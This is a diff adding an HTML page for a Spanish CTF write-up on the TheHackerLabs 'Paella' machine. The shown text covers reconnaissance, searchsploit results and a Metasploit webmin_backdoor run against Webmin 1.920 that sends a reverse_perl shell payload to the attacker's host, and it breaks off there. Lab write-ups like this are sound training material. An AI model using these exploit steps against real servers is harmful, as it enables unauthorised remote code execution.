@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paella - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-paella/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Paella - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-paella/paella.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-templo/">
+          <span class="side-post-card-title">Templo</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-caldoAvecrem/">
+          <span class="side-post-card-title">Caldo de Avecrem</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Paella</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-blackGold/">
+          <span class="side-post-card-title">Black Gold</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-chocolate/">
+          <span class="side-post-card-title">Chocolate</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Paella - TheHackerLabs</h1>
+    <div class="post-meta">22 May 2025 · 12 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-paella/paella.jpg" alt="Paella - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina sencilla, pero que me complique un poco. Al analizar los escaneos de puertos y servicios, y solamente ver 2 puertos activos, nos dirigimos al puerto 10000 que está ejecutando Webmin 1.920. Investigando un poco, encontramos que esta versión es vulnerable a ejecución remota de código (RCE). Probamos 2 Exploits, uno de Metasploit Framework para ganar acceso a la máquina y otro que comprueba si la versión de Webmin usada, es vulnerable a RCE. Además, se hace un PoC de la vulnerabilidad y se genera un Exploit que automatiza la obtención de una Reverse Shell. Ya dentro de la máquina, usamos linpeas.sh para encontrar algo que nos ayude a escalar privilegios, siendo así que descubrimos que el binario gdb tiene capabilities peligrosas, de las que nos aprovechamos para convertirnos en Root, gracias a la guía de GTFOBins.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>searchsploit</code></li><li><code>Metasploit Framework (msfconsole)</code></li><li><code>Módulo: exploit/linux/http/webmin_backdoor</code></li><li><code>python3</code></li><li><code>curl</code></li><li><code>grep</code></li><li><code>tcpdump</code></li><li><code>nc</code></li><li><code>find</code></li><li><code>wget</code></li><li><code>linpeas.sh</code></li><li><code>gdb</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework para Webmin 1.920</a></li>
+        <li><a href="#Exploit">Probando Exploit: Webmin 1.920 - Remote Code Execution</a></li>
+        <li><a href="#Exploit2">Desarrollando Exploit Remote Code Execution para Webmin 1.920</a>
+          <ul>
+            <li><a href="#RevShell">Obteniendo Reverse Shell Manual con one-liner</a></li>
+            <li><a href="#RevShell2">Obteniendo Reverse Shell con Exploit Hecho en Python</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Binario gdb</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework para Webmin 1.920</a></li>
+        <li><a href="#Exploit">Probando Exploit: Webmin 1.920 - Remote Code Execution</a></li>
+        <li><a href="#Exploit2">Desarrollando Exploit Remote Code Execution para Webmin 1.920</a>
+          <ul>
+            <li><a href="#RevShell">Obteniendo Reverse Shell Manual con one-liner</a></li>
+            <li><a href="#RevShell2">Obteniendo Reverse Shell con Exploit Hecho en Python</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Binario gdb</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.10.50
+</span></span><span style="display:flex;"><span>PING 192.168.10.50 <span style="color:#f92672">(</span>192.168.10.50<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>2.18 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.912 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.883 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.50: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.16 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.10.50 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3026ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.883/1.284/2.179/0.527 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.10.50 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-05-21 13:23 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 13:23
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.50 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 13:23, 0.08s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:23
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.50 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.10.50
+</span></span><span style="display:flex;"><span>Discovered open port 10000/tcp on 192.168.10.50
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:23, 10.48s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.50
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00058s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-05-21 13:23:09 CST <span style="color:#66d9ef">for</span> 10s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh              syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>10000/tcp open  snet-sensor-mgmt syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.74 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">71440</span> <span style="color:#f92672">(</span>3.143MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay dos puertos abiertos, pero no había visto antes el uso del <strong>puerto 10000</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,10000 192.168.10.50 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-05-21 13:24 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.50
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00100s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> f7:ac:d4:4b:58:df:a7:4a:ae:86:8c:6c:2b:55:ec:93 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ea:0b:6f:d3:fb:a4:97:3e:42:64:17:59:e7:04:56:43 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> d7:03:cb:9b:ff:9f:9c:8c:5c:0d:eb:81:4e:b5:95:40 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10000/tcp open  http    MiniServ 1.920 <span style="color:#f92672">(</span>Webmin httpd<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Login to Webmin
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 38.03 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece ser un CMS, un software, un servicio o algo parecido. Además, tenemos la versión de este servicio, por lo que podemos investigar si hay algún Exploit para esa versión.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-paella/Captura1.png">
+</p>
+<p>Parece que el servicio se llama <strong>Webmin</strong>.</p>
+<p>Vamos a investigarlo:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Webmin</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Webmin es una herramienta de configuración de sistemas accesible vía web para sistemas Unix, como GNU/Linux y OpenSolaris. Con él se pueden configurar aspectos internos de muchos sistemas libres, como el servidor web Apache, PHP, MySQL, DNS, Samba, DHCP, entre otros.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece que es un sistema de administración/configuración de sistemas para Linux, etc.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-paella/Captura2.png">
+</p>
+<p>No muestra algo que nos ayude.</p>
+<p>Comprobemos si <strong>whatweb</strong> muestra algo más:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://192.168.10.50:10000
+</span></span><span style="display:flex;"><span>http://192.168.10.50:10000 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Cookies<span style="color:#f92672">[</span>redirect,testing<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>MiniServ/1.920<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>192.168.10.50<span style="color:#f92672">]</span>, PasswordField<span style="color:#f92672">[</span>pass<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Login to Webmin<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>auth-type,content-security-policy<span style="color:#f92672">]</span>, X-Frame-Options<span style="color:#f92672">[</span>SAMEORIGIN<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>No veo nada más.</p>
+<p>Intente aplicar <strong>Fuzzing</strong>, pero parece que ni <strong>gobuster</strong> ni <strong>ffuf</strong> detectan algo.</p>
+<p>Investigando la versión de <strong>Webmin</strong> que se está ocupando, encontramos que hay un par de Exploits que podemos probar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit webmin 1.920
+</span></span><span style="display:flex;"><span>.------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                              |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Webmin 1.920 - Remote Code Execution                                                                                                                        | linux/webapps/47293.sh
+</span></span><span style="display:flex;"><span>Webmin 1.920 - Unauthenticated Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                                           | linux/remote/47230.rb
+</span></span><span style="display:flex;"><span>Webmin &lt; 1.920 - <span style="color:#e6db74">&#39;rpc.cgi&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                                               | linux/webapps/47330.rb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><p>Vamos a probar ambos, empezando por el de <strong>Metasploit</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework para Webmin 1.920</h3>
+<p>Parece que este Exploit, está explotando una Backdoor que se dejó de la <strong>versión 1.890 a 1.920</strong> de <strong>Webmin</strong>.</p>
+<p>Vamos a buscarlo y a usarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search webmin 1.920
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                     Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                     ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/linux/http/webmin_backdoor       2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>    <span style="color:#ae81ff">\_</span> target: Automatic <span style="color:#f92672">(</span>Unix In-Memory<span style="color:#f92672">)</span>  .                .          .      .
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>    <span style="color:#ae81ff">\_</span> target: Automatic <span style="color:#f92672">(</span>Linux Dropper<span style="color:#f92672">)</span>   .                .          .      .
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/linux/http/webmin_backdoor
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload cmd/unix/reverse_perl
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/http/webmin_backdoor<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Ya solo falta configurarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/http/webmin_backdoor<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.10.50
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.10.50
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/http/webmin_backdoor<span style="color:#f92672">)</span> &gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span></code></pre></div><p>Y lo ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/http/webmin_backdoor<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Configuring Automatic <span style="color:#f92672">(</span>Unix In-Memory<span style="color:#f92672">)</span> target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending cmd/unix/reverse_perl command payload
